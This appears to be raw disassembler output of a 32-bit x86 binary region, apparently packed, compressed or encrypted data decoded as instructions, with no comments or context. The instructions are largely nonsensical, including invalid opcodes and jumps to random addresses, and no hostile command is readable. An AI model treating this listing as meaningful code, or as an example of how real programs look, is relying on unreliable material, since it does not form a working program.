  40d062:	mov    edi,0xabb57c88
  40d067:	jae    0x40d077
  40d069:	hlt    
  40d06a:	mov    bh,0x2a
  40d06c:	jmp    0x40d09f
  40d06e:	inc    esi
  40d06f:	hlt    
  40d070:	push   es
  40d071:	or     al,0xc8
  40d073:	gs js  0x40d01f
  40d076:	or     edx,edx
  40d078:	gs stos DWORD PTR es:[edi],eax
  40d07a:	stos   DWORD PTR es:[edi],eax
  40d07b:	addr16 push ebx
  40d07d:	test   eax,0xa164ff52
  40d082:	stos   BYTE PTR es:[edi],al
  40d083:	mov    BYTE PTR [ebp+0x6e],bl
  40d086:	mov    edi,0xbfbd44fe
  40d08b:	je     0x40d0be
  40d08d:	xchg   ecx,eax
  40d08e:	xor    esp,DWORD PTR [edi-0x42]
  40d091:	xchg   ebp,eax
  40d092:	mov    edx,DWORD PTR [ebp+ecx*2+0x2a]
  40d096:	std    
  40d097:	inc    DWORD PTR [eax]
	...
  40d0a9:	add    BYTE PTR [eax],al
  40d0ab:	add    BYTE PTR ds:0xb047abab,ah
  40d0b1:	jecxz  0x40d06a
  40d0b3:	mov    ch,BYTE PTR [ebp*2+0x2a394128]
  40d0ba:	stos   BYTE PTR es:[edi],al
  40d0bb:	add    ebp,eax
  40d0bd:	and    eax,0x5de81436
  40d0c2:	ss clc 
  40d0c4:	jle    0x40d0a1
  40d0c6:	or     ch,al
  40d0c8:	push   ds
  40d0c9:	(bad)  
  40d0ca:	mov    edi,0xc2b210fe
  40d0cf:	je     0x40d10c
  40d0d1:	push   edx
  40d0d2:	out    0x50,al
  40d0d4:	pop    esi
  40d0d5:	jnp    0x40d091
  40d0d7:	dec    ah
  40d0d9:	in     al,dx
  40d0da:	stos   BYTE PTR es:[edi],al
  40d0db:	jns    0x40d0b1
  40d0dd:	jmp    DWORD PTR ds:0x1d3447c0
  40d0e3:	stos   DWORD PTR es:[edi],eax
  40d0e4:	retf   0x1623
  40d0e7:	shl    BYTE PTR [ebp+0x0],0xe9
  40d0eb:	inc    ebx
  40d0ec:	aaa    
  40d0ed:	ss jmp 0x40d09c
  40d0f0:	cmp    DWORD PTR ds:[ebx-0x49],0xac6f351e
  40d0f8:	cs mov ebp,0x316bf73
  40d0fe:	dec    ebp
  40d0ff:	mov    edi,0xc023c607
  40d104:	(bad)  
  40d105:	mov    ebp,0x43c203e8
  40d10a:	cmc    
  40d10b:	(bad)  
  40d10c:	out    dx,al
  40d10d:	mov    ebp,0x3e8
	...
  40d122:	add    BYTE PTR [eax],al
  40d124:	cmp    DWORD PTR [ebp+0x3bd6bc33],edi
  40d12a:	inc    ebp
  40d12b:	mov    edi,0xc02389d7
  40d130:	add    ebx,eax
  40d132:	clc    
  40d133:	add    ebp,DWORD PTR [ecx+ecx*4-0x74]
  40d137:	push   edi
  40d138:	mov    dl,0x43
  40d13a:	in     eax,0x82
  40d13c:	test   BYTE PTR [eax],0x39
  40d13f:	lods   al,BYTE PTR ds:[esi]
  40d140:	sub    eax,0xb3bf862c
  40d145:	mov    eax,0x8d2d397d
  40d14a:	in     eax,dx
  40d14b:	mov    esi,0x475e100d
  40d150:	xor    eax,0x390fe381
  40d155:	xor    al,0xee
  40d157:	mov    esi,0x47640c05
  40d15c:	inc    ecx
  40d15d:	push   eax
  40d15e:	dec    esi
  40d15f:	cmp    DWORD PTR [ecx-0x58],eax
  40d162:	pop    edx
  40d163:	xor    BYTE PTR [esi-0x43],ah
  40d166:	jno    0x40d1b1
  40d168:	inc    ebp
  40d169:	xchg   edi,edi
  40d16b:	lock sar bh,cl
  40d16e:	(bad)  
  40d16f:	call   0x2c0a2eae
  40d174:	sub    eax,0x89725500
  40d179:	add    bl,0x1d
  40d17c:	ret    0x1453
  40d17f:	cmp    eax,DWORD PTR es:[eax]
  40d182:	add    cl,ch
  40d184:	cmp    ch,cl
  40d186:	shl    esi,1
	...
  40d19c:	jno    0x40d1aa
  40d19e:	add    ecx,ebp
  40d1a0:	cmp    al,BYTE PTR [eax]
  40d1a2:	andnps xmm7,xmm3
  40d1a5:	cmp    DWORD PTR [ebp+esi*8+0x3a],0x41de1333
  40d1ad:	adc    al,0x6a
  40d1af:	jmp    0x8ca2:0xe96a0020
  40d1b6:	inc    dh
  40d1b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1ba:	sub    bl,ch
  40d1bc:	cmp    al,BYTE PTR [eax]
  40d1be:	xor    DWORD PTR [ecx+ebp*1],0xffffffff
  40d1c2:	je     0x40d1ce
  40d1c4:	mov    ?,WORD PTR [ebx]
  40d1c6:	adc    BYTE PTR [esi-0x5317f7ff],ah
  40d1cc:	adc    al,0xbd
  40d1ce:	(bad)  
  40d1cf:	pusha  
  40d1d0:	add    DWORD PTR [esi+edi*8+0x2a5114],edi
  40d1d7:	adc    esi,DWORD PTR [ecx]
  40d1d9:	mov    eax,DWORD PTR [ebp+edi*2+0xa]
  40d1dd:	test   al,0x66
  40d1df:	jbe    0x40d1b8
  40d1e1:	mov    ebp,0x38e9e8
  40d1e6:	add    BYTE PTR [edx-0x7],ch
  40d1e9:	or     eax,DWORD PTR [edx]
  40d1eb:	aam    0x9b
  40d1ed:	mov    ebp,0x33b7f974
  40d1f2:	or     BYTE PTR [ecx+0x27],al
  40d1f5:	inc    DWORD PTR es:[eax]
  40d1f8:	dec    DWORD PTR [ebx-0x7e003bd]
  40d1fe:	adc    ebp,DWORD PTR [edx+0x0]
	...
  40d211:	add    BYTE PTR [eax],al
  40d213:	add    BYTE PTR [eax-0x1a],ah
  40d216:	add    ecx,DWORD PTR [ebp-0x17b1836b]
  40d21c:	pop    esi
  40d21d:	jge    0x40d21c
  40d21f:	jmp    FWORD PTR [ecx]
  40d221:	(bad)  
  40d222:	(bad)  
  40d223:	jmp    DWORD PTR [eax]
  40d225:	jg     0x40d2a2
  40d227:	or     al,0x23
  40d229:	stc    
  40d22a:	pop    ds
  40d22b:	jmp    DWORD PTR [ebp+0x1f036a0f]
  40d231:	hlt    
  40d232:	pop    es
  40d233:	call   0x3fb7bc
  40d238:	pop    ds
  40d239:	hlt    
  40d23a:	adc    ebp,DWORD PTR [edx+0x13]
  40d23d:	jmp    0xff16:0x681069ff
  40d244:	movd   edi,mm4
  40d247:	mov    cl,0xe1
  40d249:	(bad)  
  40d24a:	inc    DWORD PTR [edx+0x7504107d]
  40d250:	xor    edi,DWORD PTR [ebp+0x73]
  40d253:	adc    BYTE PTR [edi-0x6317f80d],cl
  40d259:	jecxz  0x40d259
  40d25b:	dec    DWORD PTR [ecx+0x43]
  40d25e:	cld    
  40d25f:	jmp    DWORD PTR ds:0x3a006a18
  40d265:	or     BYTE PTR [ebp-0x17ab43bb],cl
  40d26b:	out    dx,eax
  40d26c:	mov    esi,0x28e9fd7d
  40d271:	(bad)  
  40d272:	(bad)  
  40d273:	jmp    DWORD PTR [ebx]
  40d275:	sti    
  40d276:	or     eax,DWORD PTR ds:0x0
	...
  40d28c:	test   DWORD PTR [edi+edi*8],edx
  40d28f:	jne    0x40d211
  40d291:	jmp    0x7a6d19b
  40d296:	call   0xbc0c0bf0
  40d29b:	(bad)  
  40d29c:	mov    cl,0xa8
  40d29e:	add    al,BYTE PTR [eax]
  40d2a0:	cmp    DWORD PTR [eax+0x29],edx
  40d2a3:	add    DWORD PTR [ecx],edi
  40d2a5:	test   eax,0xab457c7f
  40d2aa:	xor    eax,0x12744e20
  40d2af:	push   0x31
  40d2b1:	loop   0x40d2e9
  40d2b3:	or     BYTE PTR [ecx-0x5f],dl
  40d2b6:	and    al,0xff
  40d2b8:	adc    dh,BYTE PTR ss:[edi]
  40d2bb:	adc    al,0xa3
  40d2bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2be:	sub    BYTE PTR [eax],al
  40d2c0:	xchg   ebx,eax
  40d2c1:	test   eax,0xba1fabaa
  40d2c6:	mov    ebx,0x2a87ce8
  40d2cb:	add    BYTE PTR [edx-0x73f8f0d5],bh
  40d2d1:	or     DWORD PTR [ebp+0xc4f2974],edi
  40d2d7:	jmp    FWORD PTR [ecx+eiz*4-0x56]
  40d2db:	adc    DWORD PTR [edi-0x36],edx
  40d2de:	mov    ebx,0x28dd6cfe
  40d2e3:	add    edx,DWORD PTR [ebx-0x57]
  40d2e6:	sub    BYTE PTR [eax],al
  40d2e8:	loope  0x40d314
  40d2ea:	mov    ebp,0x1bbfcefe
  40d2ef:	add    DWORD PTR [eax],eax
	...
  40d301:	add    BYTE PTR [eax],al
  40d303:	add    BYTE PTR [ecx],bh
  40d305:	test   eax,0xb12d7c7f
  40d30a:	xor    eax,0xbfeb7e1c
  40d30f:	jmp    FWORD PTR [esi+0x2cff02a8]
  40d315:	(bad)  [eax]
  40d317:	add    BYTE PTR [ebx],dl
  40d319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d31a:	lea    eax,[ebp+edx*4+0x18]
  40d31e:	lods   al,BYTE PTR ds:[esi]
  40d31f:	arpl   WORD PTR [edi-0x7b1743d7],cx
  40d325:	(bad)  
  40d326:	call   0xdbc00c2e
  40d32b:	cmovo  esi,DWORD PTR ds:0xbbf5c4f5
  40d332:	out    0x3,eax
  40d334:	cmp    DWORD PTR [eax],eax
  40d336:	inc    esi
  40d337:	ss inc ebp
  40d339:	es jmp 0xabce1068
  40d33f:	mov    edi,0xbdaaa7fe
  40d344:	inc    edi
  40d345:	mov    edx,0xba3ed80f
  40d34a:	call   0xe34d88cf
  40d34f:	ss inc ebx
  40d351:	js     0x40d33b
  40d353:	add    edi,DWORD PTR [ecx]
  40d355:	add    BYTE PTR [eax],dl
  40d357:	enter  0xba1e,0xe8
  40d35b:	adc    BYTE PTR [ebp+0x4336e20c],0x78
  40d362:	call   0xd0410c6a
  40d367:	jg     0x40d369
	...
  40d379:	add    BYTE PTR [eax],al
  40d37b:	add    dh,bh
  40d37d:	mov    ecx,0xc7586e8
  40d382:	in     eax,0x35
  40d384:	test   BYTE PTR ds:0x7f8830bb,al
  40d38a:	inc    ebx
  40d38b:	or     BYTE PTR [ecx],bh
  40d38d:	add    BYTE PTR [ecx],ch
  40d38f:	add    cl,BYTE PTR [edx+0x48]
  40d392:	mov    dh,0x31
  40d394:	cmp    eax,0xbbb02389
  40d399:	sub    ebx,DWORD PTR [ebp-0x6ad417f8]
  40d39f:	mov    ebx,0x8680b42d
  40d3a4:	and    BYTE PTR [ecx-0x48027273],bh
  40d3aa:	test   DWORD PTR [ecx],esi
  40d3ac:	dec    ecx
  40d3ad:	mov    ecx,0x3397aff3
  40d3b2:	add    BYTE PTR [ecx-0x2e],dh
  40d3b5:	xor    al,0x8
  40d3b7:	or     DWORD PTR [eax],0xc266ff1d
  40d3bd:	xor    al,0x14
  40d3bf:	sar    DWORD PTR [ecx+edi*4],cl
  40d3c2:	je     0x40d421
  40d3c4:	mov    dl,0x34
  40d3c6:	clc    
  40d3c7:	inc    ecx
  40d3c8:	mov    WORD PTR [esi+edi*8-0x7cb5dba],?
  40d3cf:	push   ecx
  40d3d0:	push   edx
  40d3d1:	daa    
  40d3d2:	push   DWORD PTR [esi]
  40d3d4:	int    0xff
  40d3d6:	(bad)  
  40d3d7:	call   0x6aa07916
  40d3dc:	add    BYTE PTR [ecx*1+0x9b],cl
	...
  40d3f3:	add    BYTE PTR [ecx-0x7a632dfb],cl
  40d3f9:	jg     0x40d477
  40d3fb:	fnstsw WORD PTR [edx]
  40d3fd:	add    BYTE PTR [eax-0x11],al
  40d400:	addr16 dec eax
  40d402:	push   DWORD PTR [esi+edi*1-0x77]
  40d406:	inc    esp
  40d407:	std    
  40d408:	mov    bh,0x2b
  40d40a:	hlt    
  40d40b:	fsub   st(5),st
  40d40d:	sub    esi,esp
  40d40f:	out    0x49,al
  40d411:	mov    ah,0xe7
  40d413:	push   es
  40d414:	daa    
  40d415:	mov    ecx,0xb87960fe
  40d41a:	(bad)  
  40d41b:	push   esp
  40d41c:	dec    ebp
  40d41d:	mov    ecx,0x33a3bd74
  40d422:	clc    
  40d423:	mov    esi,0x13e80809
  40d428:	sbb    DWORD PTR [ecx+0x1409aefe],edi
  40d42e:	push   0xffffffe8
  40d430:	xor    DWORD PTR [ebx],0xfffffff4
  40d433:	sahf   
  40d434:	imul   edi,DWORD PTR [eax-0x460fe019],0xb8698efe
  40d43e:	out    0x0,eax
  40d440:	lods   al,BYTE PTR ds:[esi]
  40d441:	jmp    0x40d441
  40d443:	(bad)  
  40d444:	clc    
  40d445:	add    eax,DWORD PTR [eax]
  40d447:	add    BYTE PTR [eax-0x6f47fc97],ah
  40d44d:	cld    
  40d44e:	(bad)  
  40d44f:	dec    DWORD PTR [ecx-0x3d]
  40d452:	push   cs
  40d453:	add    BYTE PTR [ebp+0x56ea89],ch
	...
  40d469:	add    BYTE PTR [eax],al
  40d46b:	add    bl,ah
  40d46d:	test   DWORD PTR [edi],0x5dff8d00
  40d473:	leave  
  40d474:	adc    bh,BYTE PTR [ecx+0x48d8afe]
  40d47a:	jmp    0x40d486
  40d47c:	pop    es
  40d47d:	scas   eax,DWORD PTR es:[edi]
  40d47e:	out    0xb9,al
  40d480:	jns    0x40d4f7
  40d482:	std    
  40d483:	or     DWORD PTR [esi],0xffffffb9
  40d486:	cmp    DWORD PTR [esi],0xfff0f120
  40d48c:	int    0xb
  40d48e:	call   0xfdbb8e3c
  40d493:	pop    esi
  40d494:	imul   edi,DWORD PTR [ebp-0x7952fffe],0xbdd8bea
  40d49e:	mov    edx,DWORD PTR [ebp-0x1c]
  40d4a1:	xchg   BYTE PTR [edx],al
  40d4a3:	nop
  40d4a4:	xchg   ebx,eax
  40d4a5:	out    dx,eax
  40d4a6:	str    WORD PTR [ecx+eax*1+0x78f0558b]
  40d4ae:	cs (bad) 
  40d4b0:	sar    BYTE PTR [ebx+edi*2+0x14],cl
  40d4b4:	shl    bh,1
  40d4b6:	pop    es
  40d4b7:	mov    ebp,DWORD PTR ds:0xdc70ff10
  40d4bd:	mov    BYTE PTR [eax],al
  40d4bf:	adc    DWORD PTR ds:0xc9740014,0xffffff84
  40d4c6:	push   ebx
  40d4c7:	sbb    BYTE PTR [eax-0x77],dh
  40d4ca:	add    BYTE PTR [ebx-0x36f554c7],al
	...
  40d4e4:	jnp    0x40d493
  40d4e6:	add    dl,BYTE PTR [ebp-0x4e]
  40d4e9:	lea    eax,[ebx+eax*8-0x74adf18b]
  40d4f0:	hlt    
  40d4f1:	fdivr  DWORD PTR [edi+0x2a986ff]
  40d4f7:	add    BYTE PTR [edx+0x39c70664],dh
  40d4fd:	test   eax,0x2a390002
  40d502:	aaa    
  40d503:	or     BYTE PTR [ecx],bh
  40d505:	int3   
  40d506:	or     ch,BYTE PTR [ebx]
  40d508:	jns    0x40d569
  40d50a:	push   edi
  40d50b:	leave  
  40d50c:	jnp    0x40d4b3
  40d50e:	add    bh,bh
  40d510:	les    esp,FWORD PTR [eax-0x1a260056]
  40d516:	mov    eax,0xa94790a
  40d51b:	sub    edi,ecx
  40d51d:	jbe    0x40d576
  40d51f:	leave  
  40d520:	sti    
  40d521:	pushf  
  40d522:	add    cl,BYTE PTR [ecx+0x74b9117c]
  40d528:	xor    DWORD PTR [ecx],edx
  40d52a:	push   cs
  40d52b:	arpl   WORD PTR [esi],dx
  40d52d:	mov    dh,0xbf
  40d52f:	inc    esp
  40d530:	add    eax,0x390002a8
  40d535:	push   esp
  40d536:	aas    
  40d537:	in     al,dx
  40d538:	imul   ebp,DWORD PTR [esi+edi*1],0x2dd689f4
  40d53f:	or     cl,ah
  40d541:	jne    0x40d4ff
  40d543:	(bad)  
  40d544:	out    0xf,al
  40d546:	aas    
  40d547:	in     al,dx
	...
  40d55c:	data16 mov bl,0x83
  40d55f:	jl     0x40d52e
  40d561:	test   al,0x2e
  40d563:	add    al,0x42
  40d565:	fwait
  40d566:	or     BYTE PTR cs:[edx],dl
  40d569:	imul   ebx,DWORD PTR [eax+0x5f],0x7aafff0
  40d570:	cmp    ebx,ebp
  40d572:	and    ebp,DWORD PTR [eax-0x7d7ec33f]
  40d578:	and    eax,0xd903e8a8
  40d57d:	(bad)  
  40d57e:	dec    BYTE PTR [ebx]
  40d580:	(bad)  
  40d581:	rcr    BYTE PTR [esi],0x59
  40d584:	add    cl,0xe4
  40d587:	add    esi,DWORD PTR [edx+0x5ec2813c]
  40d58d:	add    DWORD PTR [ecx+0x5e2761ab],edi
  40d593:	mov    eax,0x8c553cc1
  40d598:	outs   dx,BYTE PTR ds:[esi]
  40d599:	mov    esi,0xb65e9fa3
  40d59e:	call   0x6c3337a6
  40d5a3:	ds dec ecx
  40d5a5:	dec    edi
  40d5a6:	fs ds dec ebp
  40d5a9:	dec    edi
  40d5aa:	cs xor DWORD PTR cs:[eax-0x49c8425b],ebp
  40d5b2:	jno    0x40d5fa
  40d5b4:	sub    edx,edi
  40d5b6:	mov    ds:0xe1fcafab,eax
  40d5bb:	aad    0xaa
  40d5bd:	adc    BYTE PTR [esi],al
  40d5bf:	add    BYTE PTR cs:[eax],al
	...
  40d5d2:	add    BYTE PTR [eax],al
  40d5d4:	adc    eax,0xe2b48a9
  40d5d9:	mov    dh,0xc1
  40d5db:	ret    
  40d5dc:	fs push ebp
  40d5de:	and    ch,al
  40d5e0:	xor    al,BYTE PTR [eax]
  40d5e2:	adc    BYTE PTR [ecx-0x1f],cl
  40d5e5:	mov    ch,0x23
  40d5e7:	mov    al,ds:0xac5381a3
  40d5ec:	out    0x2b,al
  40d5ee:	out    0x82,eax
  40d5f0:	pop    ebp
  40d5f1:	lods   al,BYTE PTR ds:[esi]
  40d5f2:	call   0x3bc2ce27
  40d5f7:	lods   al,BYTE PTR ds:[esi]
  40d5f8:	into   
  40d5f9:	sub    al,0x0
  40d5fb:	out    dx,eax
  40d5fc:	mov    ebx,0x9e9f434
  40d601:	adc    bh,bh
  40d603:	sbb    al,0xf1
  40d605:	popf   
  40d606:	jo     0x40d619
  40d608:	out    0xb6,al
  40d60a:	sub    ch,BYTE PTR [ecx-0x5436aaf1]
  40d610:	xor    DWORD PTR [eax],eax
  40d612:	add    DWORD PTR [ecx+ebx*8],0xffffffb5
  40d616:	jae    0x40d5fc
  40d618:	fisttp QWORD PTR [edx-0x76c51701]
  40d61e:	inc    esp
  40d61f:	fld    st(7)
  40d621:	sub    al,0xe4
  40d623:	jbe    0x40d662
  40d625:	mov    DWORD PTR [ebp+eax*2+0x74],eax
  40d629:	aad    0x1
  40d62b:	mov    ecx,0x4e682092
  40d630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d631:	mov    BYTE PTR [ebp+eiz*1-0x3e],al
  40d635:	xor    al,0xdc
  40d637:	jb     0x40d639
	...
  40d649:	add    BYTE PTR [eax],al
  40d64b:	add    BYTE PTR [eax],cl
  40d64d:	mov    ah,0xea
  40d64f:	xchg   ecx,eax
  40d650:	ror    DWORD PTR [ecx-0x6007d931],1
  40d656:	(bad)  
  40d657:	call   0xa4cdd696
  40d65c:	fiadd  DWORD PTR [ebp+ecx*4-0x54]
  40d660:	(bad)  
  40d661:	inc    esp
  40d662:	push   edx
  40d663:	push   cs
  40d664:	push   0xd216e808
  40d669:	mov    ch,0xfe
  40d66b:	repnz cli 
  40d66d:	xor    BYTE PTR [edx+ebp*2],cl
  40d670:	inc    eax
  40d671:	lods   al,BYTE PTR ds:[esi]
  40d672:	push   DWORD PTR [esp+edi*8-0x7f]
  40d676:	jl     0x40d641
  40d678:	cmp    ch,BYTE PTR [ebx]
  40d67a:	es push 0x31
  40d67d:	mov    al,ds:0xb5355cff
  40d682:	je     0x40d64d
  40d684:	xchg   edx,eax
  40d685:	cli    
  40d686:	addr16 add bh,bh
  40d689:	ins    DWORD PTR es:[edi],dx
  40d68a:	std    
  40d68b:	jne    0x40d639
  40d68d:	push   0x6d8ffe28
  40d692:	std    
  40d693:	jne    0x40d621
  40d695:	push   0x6ddf67f4
  40d69a:	sub    eax,eax
  40d69c:	outs   dx,BYTE PTR ds:[esi]
  40d69d:	dec    ebp
  40d69e:	leave  
  40d69f:	ret    0x9c
  40d6a2:	mov    eax,DWORD PTR [ebp-0x50]
  40d6a5:	sub    esi,edi
  40d6a7:	dec    ebp
  40d6a8:	les    eax,FWORD PTR [ecx-0x1b5f1b85]
  40d6ae:	add    eax,0x83
	...
  40d6c3:	add    BYTE PTR [ebp-0x138b019c],cl
  40d6c9:	mov    DWORD PTR [ebx+0xc],eax
  40d6cc:	fucomip st,st(7)
  40d6ce:	fisttp DWORD PTR [edi-0x38c92a0]
  40d6d4:	clc    
  40d6d5:	leave  
  40d6d6:	gs (bad) 
  40d6d8:	out    dx,eax
  40d6d9:	cmp    BYTE PTR [eax],al
  40d6db:	add    BYTE PTR [eax+0x0],ah
  40d6de:	pop    esi
  40d6df:	pop    edi
  40d6e0:	or     DWORD PTR [edi-0x765afff6],edi
  40d6e6:	jmp    0xdd83:0x55c91483
  40d6ed:	(bad)  
  40d6ef:	jne    0x40d71b
  40d6f1:	cmp    BYTE PTR [eax],al
  40d6f3:	add    BYTE PTR [eax],dl
  40d6f5:	add    BYTE PTR [edi-0x37],bl
  40d6f8:	push   edx
  40d6f9:	add    eax,DWORD PTR [eax]
  40d6fb:	dec    ebp
  40d6fd:	(bad)  
  40d6ff:	ror    BYTE PTR [ebx-0xa08efc0],cl
  40d705:	jae    0x40d76b
  40d707:	inc    ecx
  40d708:	adc    BYTE PTR [ebp-0x3750fbd],al
  40d70e:	(bad)  
  40d70f:	jne    0x40d721
  40d711:	outs   dx,BYTE PTR ds:[esi]
  40d712:	jae    0x40d71c
  40d714:	cmp    ecx,eax
  40d716:	sbb    DWORD PTR [edi-0x22],ebx
  40d719:	ret    0x7c80
  40d71c:	sub    DWORD PTR [ecx-0x579cf3d3],ebp
  40d722:	sub    BYTE PTR [esi+eax*8-0xc],ah
  40d726:	or     ebp,eax
	...
  40d73c:	xor    DWORD PTR [edx],eax
  40d73e:	mov    ch,0xfe
  40d740:	mov    dh,0x14
  40d742:	adc    bh,bh
  40d744:	and    al,0xb1
  40d746:	stos   BYTE PTR es:[edi],al
  40d747:	dec    edx
  40d748:	sbb    ecx,DWORD PTR [edx-0x7b0b774c]
  40d74e:	mov    ah,0x74
  40d750:	sub    eax,0xa1082e7a
  40d755:	fldenv [eax]
  40d757:	inc    DWORD PTR [esi+0x7e142f2a]
  40d75d:	lods   al,BYTE PTR ds:[esi]
  40d75e:	or     ch,al
  40d760:	cmp    al,0xc7
  40d762:	mov    bl,0xfe
  40d764:	rcr    BYTE PTR [edx+edi*4-0x2],0xec
  40d769:	mov    ah,0xb3
  40d76b:	je     0x40d79e
  40d76d:	inc    ecx
  40d76e:	lods   eax,DWORD PTR ds:[esi]
  40d76f:	pusha  
  40d770:	push   esi
  40d771:	cmp    dh,BYTE PTR [ebp+0x2ef22574]
  40d777:	or     BYTE PTR [ecx-0x30],dl
  40d77a:	and    bh,bh
  40d77c:	ds push ds
  40d77e:	aas    
  40d77f:	adc    al,0xba
  40d781:	mov    al,ds:0x263d7402
  40d786:	aaa    
  40d787:	cld    
  40d788:	xor    al,0x95
  40d78a:	add    eax,0xff059c83
  40d78f:	jae    0x40d7cf
  40d791:	into   
  40d792:	ret    0x5e
  40d795:	out    0xf,eax
  40d797:	add    al,bl
  40d799:	in     al,0x1d
  40d79b:	inc    ecx
  40d79c:	cmp    DWORD PTR [eax],ebx
  40d79e:	lods   al,BYTE PTR ds:[esi]
  40d79f:	cmp    BYTE PTR [eax],al
	...
  40d7b1:	add    BYTE PTR [eax],al
  40d7b3:	add    BYTE PTR [eax+eax*1-0x1f],bh
  40d7b7:	sub    eax,0x54a8e736
  40d7bc:	lock mov ebp,0x34ba03fc
  40d7c2:	int    0xfe
  40d7c4:	dec    ebp
  40d7c5:	add    al,dh
  40d7c7:	cs and eax,0xd10c33b3
  40d7cd:	add    BYTE PTR [edi-0x4b],0xbf
  40d7d1:	mov    BYTE PTR [ebx],ah
  40d7d3:	int3   
  40d7d4:	push   ds
  40d7d5:	add    cl,ch
  40d7d7:	add    bh,BYTE PTR [ecx]
  40d7d9:	test   al,0xe5
  40d7db:	sbb    al,0xa6
  40d7dd:	mov    dl,0x5f
  40d7df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7e1:	out    0x8d,al
  40d7e3:	test   al,0x28
  40d7e5:	mov    bl,0xfb
  40d7e7:	jle    0xb4ecc919
  40d7ed:	and    BYTE PTR [esi-0x4c],dh
  40d7f0:	mov    bl,0x4c
  40d7f2:	jne    0x40d77e
  40d7f4:	cmp    dh,BYTE PTR [esi-0x53]
  40d7f7:	clc    
  40d7f8:	in     eax,dx
  40d7f9:	mov    bh,0xda
  40d7fb:	stos   BYTE PTR es:[edi],al
  40d7fc:	mov    bl,0x3c
  40d7fe:	std    
  40d7ff:	and    BYTE PTR [esi],0x0
  40d802:	aam    0x4
  40d804:	push   esi
  40d805:	sub    al,0x3d
  40d807:	stos   DWORD PTR es:[edi],eax
  40d808:	js     0x40d823
  40d80a:	ds mov ah,0x13
  40d80d:	rcl    BYTE PTR [ebp-0x16f48736],0x80
  40d814:	mov    ch,0xb4
  40d816:	jmp    0x40d81c
	...
  40d82c:	mov    ah,0x59
  40d82e:	call   0x16261136
  40d833:	test   al,0x8c
  40d835:	test   DWORD PTR [ebx+0x42fcc3af],esi
  40d83b:	add    BYTE PTR [eax+esi*4-0x6e],dh
  40d83f:	add    ebp,DWORD PTR [ecx-0x4f]
  40d842:	(bad)  
  40d843:	jnp    0x40d877
  40d845:	test   al,0x27
  40d847:	(bad)  
  40d848:	lods   eax,DWORD PTR ds:[esi]
  40d849:	mov    dl,0xfe
  40d84b:	pop    esp
  40d84c:	push   ecx
  40d84d:	mov    cl,0x74
  40d84f:	icebp  
  40d850:	ret    0x610f
  40d853:	(bad)  
  40d854:	stos   BYTE PTR es:[edi],al
  40d855:	mov    BYTE PTR [ebp+ebx*4+0x37],al
  40d859:	add    bh,bh
  40d85b:	cmp    al,0x31
  40d85d:	mov    cl,0x74
  40d85f:	icebp  
  40d860:	mov    ds:0x8ab6f848,al
  40d865:	xchg   BYTE PTR [ebp+edx*8-0x41],cl
  40d869:	clc    
  40d86a:	call   FWORD PTR [ebx]
  40d86c:	cmp    dh,BYTE PTR [ecx+0x23c59574]
  40d872:	xchg   si,ax
  40d874:	jmp    0x13bf:0xd42ebfe6
  40d87b:	jmp    0x7e59054b
  40d880:	inc    eax
  40d881:	or     al,0xff
  40d883:	cld    
  40d884:	mov    esi,0xabdd74b2
  40d889:	sub    al,0x8
  40d88b:	push   ecx
  40d88c:	(bad)  
  40d88d:	mov    bl,0xfe
  40d88f:	pop    esi
	...
  40d8a4:	data16 jno 0x40d91b
  40d8a7:	out    0xab,al
  40d8a9:	sub    al,0xf4
  40d8ab:	inc    ecx
  40d8ac:	add    bl,BYTE PTR [edx]
  40d8ae:	inc    DWORD PTR [esi+0x6e]
  40d8b1:	jno    0x40d911
  40d8b3:	xor    BYTE PTR [edi+0xd],bh
  40d8b6:	add    BYTE PTR [esi-0x4407cbb1],ch
  40d8bc:	mov    ecx,0xea0174b1
  40d8c1:	sub    edx,DWORD PTR [esi+ebx*1]
  40d8c4:	pusha  
  40d8c5:	enter  0x9cfe,0x1e
  40d8c9:	mov    dl,0x74
  40d8cb:	loope  0x40d87f
  40d8cd:	sbb    bh,dh
  40d8cf:	add    BYTE PTR [edi],dh
  40d8d1:	ins    DWORD PTR es:[edi],dx
  40d8d2:	or     eax,eax
  40d8d4:	pop    ss
  40d8d5:	mov    BYTE PTR [eax+0x1],dl
  40d8d8:	adc    ch,bh
  40d8da:	(bad)  
  40d8db:	jne    0x40d8c9
  40d8dd:	xchg   esp,eax
  40d8de:	adc    al,0x66
  40d8e0:	xlat   BYTE PTR ds:[ebx]
  40d8e1:	ins    DWORD PTR es:[edi],dx
  40d8e2:	sub    eax,eax
  40d8e4:	daa    
  40d8e5:	jae    0x40d8a7
  40d8e7:	adc    al,0xd0
  40d8e9:	xchg   ebx,eax
  40d8ea:	cmp    al,0x1
  40d8ec:	loopne 0x40d8ea
  40d8ee:	cmp    BYTE PTR [ebp-0xc],0xff
  40d8f2:	push   cs
  40d8f3:	test   esp,ecx
  40d8f5:	sti    
  40d8f6:	(bad)  
  40d8f7:	(bad)  
  40d8f8:	cmp    ebp,DWORD PTR [ebp-0x19]
  40d8fb:	and    al,0xa1
  40d8fd:	cld    
  40d8fe:	dec    DWORD PTR [edx+0x489786d]
  40d904:	sbb    bh,dl
  40d906:	inc    esp
  40d907:	lock add BYTE PTR [eax],al
	...
  40d91a:	add    BYTE PTR [eax],al
  40d91c:	cmp    bh,ah
  40d91e:	dec    edi
  40d91f:	jmp    FWORD PTR ds:0x5574e6b4
  40d925:	ins    DWORD PTR es:[edi],dx
  40d926:	std    
  40d927:	push   0xffffff90
  40d929:	ins    DWORD PTR es:[edi],dx
  40d92a:	jae    0x40d940
  40d92c:	pop    es
  40d92d:	clc    
  40d92e:	pop    es
  40d92f:	call   0x3e4f37
  40d934:	jmp    0x40d975
  40d936:	adc    al,0x83
  40d938:	sbb    esp,edi
  40d93a:	je     0x40d94b
  40d93c:	pop    es
  40d93d:	clc    
  40d93e:	repz call 0x3fc15c
  40d944:	sub    edi,DWORD PTR [ebp+ebx*2+0x912c9]
  40d94b:	or     esp,DWORD PTR [edx]
  40d94d:	jmp    0x3b5c256
  40d952:	add    BYTE PTR [eax],al
  40d954:	test   eax,0x106aec38
  40d959:	jae    0x40d9ce
  40d95b:	adc    al,0x39
  40d95d:	push   ss
  40d95e:	cmp    BYTE PTR [eax],cl
  40d960:	and    DWORD PTR [ebx+0x330efeb9],ecx
